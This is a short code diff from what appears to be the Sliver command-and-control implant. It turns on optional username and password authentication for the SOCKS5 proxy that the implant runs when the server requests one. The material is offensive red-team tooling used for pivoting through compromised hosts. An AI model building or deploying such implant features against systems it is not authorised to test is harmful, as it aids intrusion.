@@ -376,18 +376,17 @@ func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	log.Printf("[socks] User to Client to (server to implant) Data Sequence %d, Data Size %d\n", socksData.Sequence, len(socksData.Data))
 	// {{end}}
 
-	// if socksData.Username != "" && socksData.Password != "" {
-	// 	cred := socks5.StaticCredentials{
-	// 		socksData.Username: socksData.Password,
-	// 	}
-	// 	auth := socks5.UserPassAuthenticator{Credentials: cred}
-	// 	socksServer = socks5.NewServer(
-	// 		socks5.WithAuthMethods([]socks5.Authenticator{auth}),
-
-	// 	)
-	// } else {
-	socksServer = socks5.NewServer()
-	//}
+	if socksData.Username != "" && socksData.Password != "" {
+		cred := socks5.StaticCredentials{
+			socksData.Username: socksData.Password,
+		}
+		auth := socks5.UserPassAuthenticator{Credentials: cred}
+		socksServer = socks5.NewServer(
+			socks5.WithAuthMethods([]socks5.Authenticator{auth}),
+		)
+	} else {
+		socksServer = socks5.NewServer()
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("[socks] Server: %v", socksServer)
